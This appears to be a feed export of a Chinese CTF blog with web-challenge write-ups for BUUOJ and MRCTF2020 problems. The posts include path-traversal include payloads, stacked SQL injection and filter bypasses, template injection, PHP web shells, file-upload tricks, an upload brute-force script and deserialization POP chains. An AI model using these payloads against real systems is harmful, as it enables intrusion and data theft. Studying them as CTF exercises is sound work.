    <content type="html"><![CDATA[<h1 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h1><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>    highlight_file(<span class="hljs-keyword">__FILE__</span>);    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><span class="hljs-class">    </span>&#123;        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><span class="hljs-function">        </span>&#123;            <span class="hljs-comment"># 定义一个白名单</span>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];              <span class="hljs-comment"># 判断$page是否为字符串</span>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !is_string(<span class="hljs-variable">$page</span>)) &#123;                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-comment"># 判断是否在白名单中，若是直接返回true</span>            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-comment"># 截取问号之前的</span>            <span class="hljs-variable">$_page</span> = mb_substr(                <span class="hljs-variable">$page</span>,                <span class="hljs-number">0</span>,                mb_strpos(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)            );            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-comment"># url解码后截取问号之前的</span>            <span class="hljs-variable">$_page</span> = urldecode(<span class="hljs-variable">$page</span>);            <span class="hljs-variable">$_page</span> = mb_substr(                <span class="hljs-variable">$_page</span>,                <span class="hljs-number">0</span>,                mb_strpos(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)            );            <span class="hljs-keyword">if</span> (in_array(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-comment"># 满足一个</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])        &amp;&amp; is_string(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])        &amp;&amp; emmm::checkFile(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])    ) &#123;        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];        <span class="hljs-keyword">exit</span>;    &#125; <span class="hljs-keyword">else</span> &#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;    &#125;  <span class="hljs-meta">?&gt;</span> flag&#123;<span class="hljs-number">1</span>a46def3<span class="hljs-number">-344</span>d<span class="hljs-number">-4156</span><span class="hljs-number">-8</span>d1a-bc68155e61c7&#125;<span class="hljs-comment"># 可以利用?截取hint.php，然后利用/使hint.php?成为一个不存在的目录，最后include利用../../跳转目录读取flag</span><span class="hljs-comment"># 如 ?file=hint.php?/../hint.php 可以读取到hint.php</span><span class="hljs-comment"># payload: source.php?file=source.php?/../../../../../ffffllllaaaagggg</span></code></pre><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><pre><code class="hljs sql">叠堆注入1.handler代替  <span class="hljs-keyword">handler</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">open</span> <span class="hljs-keyword">as</span> yun;<span class="hljs-keyword">handler</span> yun <span class="hljs-keyword">read</span> <span class="hljs-keyword">first</span>;2.改表名、字段       1&#x27;;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">to</span> word1;<span class="hljs-keyword">rename</span> <span class="hljs-keyword">table</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">to</span> words;<span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words <span class="hljs-keyword">add</span> <span class="hljs-keyword">id</span> <span class="hljs-built_in">int</span> <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">Null</span> auto_increment primary <span class="hljs-keyword">key</span>; alert table words <span class="hljs-keyword">change</span> flag <span class="hljs-keyword">data</span> <span class="hljs-built_in">varchar</span>(<span class="hljs-number">100</span>);3.预编译+拼接绕过+大小写绕过  <span class="hljs-keyword">Set</span> @a=<span class="hljs-keyword">concat</span>(<span class="hljs-string">&quot;sel&quot;</span>,<span class="hljs-string">&quot;ect &quot;</span>,<span class="hljs-string">&quot;fl&quot;</span>,<span class="hljs-string">&quot;ag f&quot;</span>,<span class="hljs-string">&quot;rom &quot;</span>,<span class="hljs-string">&quot;`1919810931114514`&quot;</span>);<span class="hljs-keyword">pRepare</span> dump <span class="hljs-keyword">from</span> @a;<span class="hljs-keyword">execute</span> dump;</code></pre><h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><pre><code class="hljs handlebars"><span class="xml">1.render模板注入/error?msg=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">handler.settings</span>&#125;&#125;</span><span class="xml">2.根据md5(cookie_secret+md5(filename))读/fllllllllllllag</span></code></pre><h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><pre><code class="hljs sqf">payload: <span class="hljs-number">1</span>;<span class="hljs-built_in">set</span> sql_mode=PIPES_AS_CONCAT;<span class="hljs-built_in">select</span> <span class="hljs-number">3</span>后端逻辑，没想到qvq <span class="hljs-built_in">select</span> $<span class="hljs-variable">_POST</span>[query] || <span class="hljs-built_in">flag</span> <span class="hljs-keyword">from</span> <span class="hljs-built_in">flag</span></code></pre><h1 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h1><pre><code class="hljs awk"><span class="hljs-number">1</span>.flask session 伪造  要到github找源码qvq 思路不够广<span class="hljs-number">2</span>.unicode欺骗  ᴀʙᴄᴅᴇꜰɢʜɪᴊᴋʟᴍɴᴏᴘʀꜱᴛᴜᴠᴡʏᴢ  <span class="hljs-comment"># 想起js 见下面</span><span class="hljs-number">3</span>.条件竞争参考：https:<span class="hljs-regexp">//</span>skysec.top<span class="hljs-regexp">/2018/</span><span class="hljs-number">11</span><span class="hljs-regexp">/12/</span><span class="hljs-number">2018</span>-HCTF-Web-Writeup/<span class="hljs-comment">#admin</span></code></pre><pre><code class="hljs awk">参考 https:<span class="hljs-regexp">//</span>xz.aliyun.com<span class="hljs-regexp">/t/</span><span class="hljs-number">7184</span><span class="hljs-comment">#toc-11</span>对于toUpperCase():字符<span class="hljs-string">&quot;ı&quot;</span>、<span class="hljs-string">&quot;ſ&quot;</span> 经过toUpperCase处理后结果为 <span class="hljs-string">&quot;I&quot;</span>、<span class="hljs-string">&quot;S&quot;</span>对于toLowerCase():字符<span class="hljs-string">&quot;K&quot;</span>经过toLowerCase处理后结果为<span class="hljs-string">&quot;k&quot;</span>(这个K不是K)在绕一些规则的时候就可以利用这几个特殊字符进行绕过</code></pre><h1 id="RoarCTF-2019-Easy-Calc"><a href="#RoarCTF-2019-Easy-Calc" class="headerlink" title="[RoarCTF 2019]Easy Calc"></a>[RoarCTF 2019]Easy Calc</h1><pre><code class="hljs clean"># ?%<span class="hljs-number">20</span>num=<span class="hljs-number">1</span> 加空格绕过WAF 另一种好像是HTTP走私绕WAF<span class="hljs-number">1.</span>取反绕过(~%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>e%<span class="hljs-number">8</span>d%a0%<span class="hljs-number">9</span>b%<span class="hljs-number">8</span>a%<span class="hljs-number">92</span>%<span class="hljs-number">8</span>f)((~%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>e%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>b%<span class="hljs-number">96</span>%<span class="hljs-number">8</span>d)((~%d0)))  #var_dump(scandir(/))(~%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">9</span>e%<span class="hljs-number">9</span>b%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">9</span>a)((~%d0%<span class="hljs-number">99</span>%ce%<span class="hljs-number">9</span>e%<span class="hljs-number">98</span>%<span class="hljs-number">98</span>))        #readfile(/f1agg)或则show_source(session_id(session_start()));设置cookie PHPSESSID=/f1agg## 补：利用http头 ayrain: <span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27; cat theflag.php &#x27;</span>);payload=eval(end(getallheaders()))###################################################################GET /calc.php?%<span class="hljs-number">20</span>num=<span class="hljs-number">1</span>;(~%<span class="hljs-number">8</span>c%<span class="hljs-number">97</span>%<span class="hljs-number">90</span>%<span class="hljs-number">88</span>%a0%<span class="hljs-number">8</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">8</span>a%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>a)((~%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%a0%<span class="hljs-number">96</span>%<span class="hljs-number">9</span>b)((~%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>c%<span class="hljs-number">96</span>%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%a0%<span class="hljs-number">8</span>c%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>e%<span class="hljs-number">8</span>d%<span class="hljs-number">8</span>b)())) HTTP/<span class="hljs-number">1.1</span>Host: <span class="hljs-number">5394</span><span class="hljs-number">-5</span>dc0e7b6-ef10<span class="hljs-number">-489</span>f-bf44<span class="hljs-number">-78e467</span>b95f3f.node3.buuoj.cn:<span class="hljs-number">28586</span>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">74.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">74.0</span>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,*<span class="hljs-comment">/*;q=0.8</span><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">Cookie: PHPSESSID=/f1agg</span><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><span class="hljs-comment">#################################################################</span><span class="hljs-comment"></span><span class="hljs-comment">2.?%20num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</span></code></pre><h1 id="强网杯-2019-高明的黑客"><a href="#强网杯-2019-高明的黑客" class="headerlink" title="[强网杯 2019]高明的黑客"></a>[强网杯 2019]高明的黑客</h1><p>写脚本qwq</p><h1 id="极客大挑战-2019-EasySQL"><a href="#极客大挑战-2019-EasySQL" class="headerlink" title="[极客大挑战 2019]EasySQL"></a>[极客大挑战 2019]EasySQL</h1><p>万能密码  admin’ or 1=1#</p><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><pre><code class="hljs stylus">#上传 <span class="hljs-selector-class">.user</span>.iniauto_prepend_file=script.jpg#上传 script.jpg&lt;script language=<span class="hljs-string">&#x27;php&#x27;</span>&gt;assert($_REQUEST[<span class="hljs-string">&#x27;cmd&#x27;</span>])&lt;/script&gt;index<span class="hljs-selector-class">.php</span> 连接即可</code></pre><h1 id="极客大挑战-2019-Havefun"><a href="#极客大挑战-2019-Havefun" class="headerlink" title="[极客大挑战 2019]Havefun"></a>[极客大挑战 2019]Havefun</h1><p>F12</p><p>#[CISCN2019 华北赛区 Day2 Web1]Hack World</p><pre><code class="hljs css">盲注  <span class="hljs-selector-tag">if</span>(<span class="hljs-selector-tag">ascii</span>(<span class="hljs-selector-tag">substr</span>(&#123;&#125;,&#123;&#125;,1))&gt;&#123;&#125;,1,2)</code></pre><h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>注入读文件</p><h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><p><a href="https://xz.aliyun.com/t/5927#toc-2">https://xz.aliyun.com/t/5927#toc-2</a></p><p>读代码 ，哈希长度扩展攻击</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p><a href="https://www.cnblogs.com/wangtanzhi/p/12173215.html">https://www.cnblogs.com/wangtanzhi/p/12173215.html</a></p><pre><code class="hljs clean">WEB-INF主要包含一下文件或目录:/WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 <span class="hljs-keyword">class</span> 文件，包括 servlet <span class="hljs-keyword">class</span> 和非servlet <span class="hljs-keyword">class</span>，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="hljs-keyword">class</span>文件的路径，最后直接<span class="hljs-keyword">class</span>文件，在通过反编译<span class="hljs-keyword">class</span>文件，得到网站源码##############################################http:<span class="hljs-comment">//be68d98c-4847-45b7-a598-eae71a16a730.node3.buuoj.cn/Download?</span>POST:filename=/WEB-INF/classes/com/wm/ctf/FlagController.<span class="hljs-keyword">class</span></code></pre><h1 id="RoarCTF-2019-Simple-Upload"><a href="#RoarCTF-2019-Simple-Upload" class="headerlink" title="[RoarCTF 2019]Simple Upload"></a>[RoarCTF 2019]Simple Upload</h1><p>Think PHP upload()多文件上传</p><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-keyword">import</span> jsonurl = <span class="hljs-string">&quot;http://a9c6eb2d-473c-4a53-9920-1dcd4bd8f42c.node3.buuoj.cn/&quot;</span>path = url + <span class="hljs-string">&quot;/index.php/home/index/upload&quot;</span>files = &#123;<span class="hljs-string">&quot;file&quot;</span>:(<span class="hljs-string">&quot;a.txt&quot;</span>,<span class="hljs-string">&#x27;a&#x27;</span>), <span class="hljs-string">&quot;file1&quot;</span>:(<span class="hljs-string">&quot;b.php&quot;</span>, <span class="hljs-string">&#x27;&lt;?php eval($_GET[&quot;a&quot;]);&#x27;</span>)&#125;r = requests.post(path, files=files)t1 = r.text.split(<span class="hljs-string">&quot;/&quot;</span>)[-<span class="hljs-number">1</span>].split(<span class="hljs-string">&quot;.&quot;</span>)[<span class="hljs-number">0</span>]param=json.loads(r.content)<span class="hljs-built_in">print</span> (param)t1 = <span class="hljs-built_in">int</span>(t1, <span class="hljs-number">16</span>)j = t1<span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    path = url + <span class="hljs-string">&quot;/Public/Uploads/&quot;</span>+param[<span class="hljs-string">&#x27;url&#x27;</span>].split(<span class="hljs-string">&quot;/&quot;</span>)[-<span class="hljs-number">2</span>]+<span class="hljs-string">&quot;/%s.php&quot;</span> % <span class="hljs-built_in">hex</span>(j)[<span class="hljs-number">2</span>:-<span class="hljs-number">1</span>]    <span class="hljs-keyword">try</span>:        r = requests.get(path,timeout=<span class="hljs-number">1</span>)    <span class="hljs-keyword">except</span>:        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">429</span>:<span class="hljs-comment">#规避过于频繁访问导致的429</span>        time.sleep(<span class="hljs-number">0.1</span>)        <span class="hljs-keyword">continue</span>    <span class="hljs-keyword">elif</span> r.status_code != <span class="hljs-number">404</span>:        <span class="hljs-built_in">print</span> (path)        <span class="hljs-built_in">print</span> (r.text)        <span class="hljs-keyword">break</span>    <span class="hljs-built_in">print</span> (j, path, r.status_code)    j -= <span class="hljs-number">1</span><span class="hljs-comment"># 5e8944548cf90.txt</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUOJ</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[MRCTF2020]web复现</title>
    <link href="/2020/04/01/MRCTF2020-%E5%A4%8D%E7%8E%B0/"/>
    <url>/2020/04/01/MRCTF2020-%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>没打MRCTF  赛后复现一下，对比V&amp;N的其他师傅我还是太菜，努力追上他们！！！</p></blockquote><h1 id="PYWebsite"><a href="#PYWebsite" class="headerlink" title="PYWebsite"></a>PYWebsite</h1><ol><li><p>查看源码有js跳转到 flag.php,直接访问</p></li><li><p>伪造IP 为127.0.0.1</p><pre><code class="hljs apache"><span class="hljs-attribute">X</span>-Forwarded-For: <span class="hljs-number">127.0.0.1</span>  # 下面有一题禁用XFF 但可以用Client-ip: <span class="hljs-number">127.0.0.1</span>代替验证</code></pre></li></ol><h1 id="Ez-bypass"><a href="#Ez-bypass" class="headerlink" title="Ez_bypass"></a>Ez_bypass</h1><ol><li>绕过MD5, 可以用数组绕、科学计数法绕  当然可以MD5碰撞（手动狗头</li><li>PHP弱等于 1234567a就可以</li></ol><h1 id="EzPop"><a href="#EzPop" class="headerlink" title="EzPop"></a>EzPop</h1><ol><li><p>官方的wp分析的很详细</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//flag is in flag.php</span><span class="hljs-comment">//WTF IS THIS?</span><span class="hljs-comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><span class="hljs-comment">//And Crack It!</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<span class="hljs-comment">//8.触发这个include，利用php base64 wrapper 读flag</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;append(<span class="hljs-keyword">$this</span>-&gt;var);<span class="hljs-comment">//7.然后会调用到这里</span>    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;str-&gt;source;<span class="hljs-comment">//4.这里会调用str-&gt;source的__get 那么我们将其设置为Test对象</span>    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//2.如果pop是个Show,那么调用这里</span>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-keyword">$this</span>-&gt;source)) &#123;<span class="hljs-comment">//3.匹配的时候会调用__toString</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;            <span class="hljs-keyword">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;        &#125;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;        <span class="hljs-variable">$function</span> = <span class="hljs-keyword">$this</span>-&gt;p;<span class="hljs-comment">//5.触发到这里</span>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<span class="hljs-comment">//6.()会调用__invoke,我们这里选择Modifier对象</span>    &#125;&#125;<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;    @unserialize(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<span class="hljs-comment">//1.反序列调用这里</span>&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> Show;    highlight_file(<span class="hljs-keyword">__FILE__</span>);&#125;</code></pre></li><li><p><a href="https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95">题目给的博客、学习了</a> </p></li><li><pre><code>Modifier 里 include+伪协议读文件Modifier 里 __invoke触发的话可以粗发include     #__invoke()//调用函数的方式调用一个对象时的回应方法Test     里 __get下可以 调用函数的方式调用一个对象 #__get()//获得一个类的成员变量时调用Show     里 __toString下str设置为Test可触发Test下__getif(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) source设置为Show 会触发__toString<pre><code class="hljs awk"><span class="hljs-number">4</span>. 关于反序列化的一些魔术方法     `__construct()<span class="hljs-regexp">//</span>当一个对象创建时被调用`   `__destruct() <span class="hljs-regexp">//</span>当一个对象销毁时被调用`   `__toString() <span class="hljs-regexp">//</span>当一个对象被当作一个字符串使用`   `__sleep()<span class="hljs-regexp">//</span>在对象在被序列化之前运行`   `__wakeup()<span class="hljs-regexp">//</span>将在反序列化之后立即被调用(通过序列化对象元素个数不符来绕过)`   `__get()<span class="hljs-regexp">//</span>获得一个类的成员变量时调用`   `__set()<span class="hljs-regexp">//</span>设置一个类的成员变量时调用`   `__invoke()<span class="hljs-regexp">//</span>调用函数的方式调用一个对象时的回应方法`   `__call()<span class="hljs-regexp">//</span>当调用一个对象中的不能用的方法的时候就会执行这个函数`<span class="hljs-comment"># 套娃</span><span class="hljs-number">1</span>. 在URL中GET请求当输入`.`或者` `(空格)或者`_`都会忽略，因此`b_u_p_t`,其实就是`b u p t`     <span class="hljs-comment">#涨知识了</span><span class="hljs-number">2</span>. 正则匹配时   %<span class="hljs-number">0</span>A换行污染<span class="hljs-number">3</span>. Client-ip: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> 绕<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>限制<span class="hljs-number">4</span>. 后面写一个返加密的东西 传入读完事<span class="hljs-comment"># Ezaudit</span><span class="hljs-number">1</span>.  `mt_rand` 伪随机数，用 php_mt_seed-<span class="hljs-number">4.0</span> 工具爆破种子，注意使用时要求的格式    `Usage: ./php_mt_seed VALUE_OR_MATCH_MIN [MATCH_MAX [RANGE_MIN RANGE_MAX]] ...`<span class="hljs-number">2</span>. 然后是注入直接登录完事<span class="hljs-comment"># 你传你🐎呢</span><span class="hljs-number">1</span>. 只允许   Content-Type: image/png<span class="hljs-number">2</span>. 上传一个.htaccess 让jpg解析    `AddType application/x-httpd-php .jpg`<span class="hljs-number">3</span>. 上马<span class="hljs-comment"># Ezpop Revenge</span><span class="hljs-number">1</span>. 找到unserialize()函数 C0incid3nc3可控，往上找找到如何触发action()   ![<span class="hljs-number">1</span>](https:<span class="hljs-regexp">//</span>s1.ax1x.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/06/</span>GyXTX9.png)<span class="hljs-number">2</span>. `Helper::addRoute(<span class="hljs-string">&quot;page_admin_action&quot;</span>,<span class="hljs-string">&quot;/page_admin&quot;</span>,<span class="hljs-string">&quot;HelloWorld_Plugin&quot;</span>,<span class="hljs-string">&#x27;action&#x27;</span>);`   ![G6Eoef.png](https:<span class="hljs-regexp">//</span>s1.ax1x.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/06/</span>G6Eoef.png)   访问page_admin，就会访问HelloWorld_Plugin类中的action方法<span class="hljs-number">3</span>. HelloWorld_DB中__wakeup   ![G6V0hQ.png](https:<span class="hljs-regexp">//</span>s1.ax1x.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/06/</span>G6V0hQ.png)<span class="hljs-number">4</span>. 跟进Typecho_Db   ![G6ZiHf.png](https:<span class="hljs-regexp">//</span>s1.ax1x.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/06/</span>G6ZiHf.png)   会触发<span class="hljs-variable">$adapterName</span>中的__toString<span class="hljs-number">5</span>. Typecho_Db_Query    ![G6eRW4.png](https:<span class="hljs-regexp">//</span>s1.ax1x.com<span class="hljs-regexp">/2020/</span><span class="hljs-number">04</span><span class="hljs-regexp">/06/</span>G6eRW4.png)   <span class="hljs-variable">$this</span>-&gt;_adapter设置为SoapClient，调用一个没有的方法刚好能触发SoapClient里的__call导致SSRF综合：```php<span class="hljs-comment"># 建一个HelloWorld_DB，$coincidence设置为Typecho_Db_Query</span><span class="hljs-comment"># Typecho_Db_Query，$_adapter设置为SoapClient，反序列化访问flag.php即可</span>&lt;?phpclass HelloWorld_DB&#123;    private <span class="hljs-variable">$coincidence</span>;    public <span class="hljs-keyword">function</span> __construct()&#123;        <span class="hljs-variable">$this</span>-&gt;coincidence=array(<span class="hljs-string">&quot;hello&quot;</span>=&gt;new Typecho_Db_Query());    &#125;&#125;class Typecho_Db_Query&#123;    private <span class="hljs-variable">$_sqlPreBuild</span>;    private <span class="hljs-variable">$_adapter</span>;    public <span class="hljs-keyword">function</span> __construct()&#123;        <span class="hljs-variable">$this</span>-&gt;_sqlPreBuild=array(<span class="hljs-string">&#x27;action&#x27;</span>=&gt;<span class="hljs-string">&#x27;SELECT&#x27;</span>);        <span class="hljs-variable">$target</span> = <span class="hljs-string">&#x27;http://127.0.0.1/flag.php&#x27;</span>;        <span class="hljs-variable">$post_string</span> = <span class="hljs-string">&#x27;&#x27;</span>;        <span class="hljs-variable">$headers</span> = array(            <span class="hljs-string">&#x27;X-Forwarded-For: 127.0.0.1&#x27;</span>,            <span class="hljs-string">&#x27;Cookie: PHPSESSID=aaab&#x27;</span>        );        <span class="hljs-variable">$this</span>-&gt;_adapter = new SoapClient(null,array(<span class="hljs-string">&#x27;location&#x27;</span> =&gt; <span class="hljs-variable">$target</span>,<span 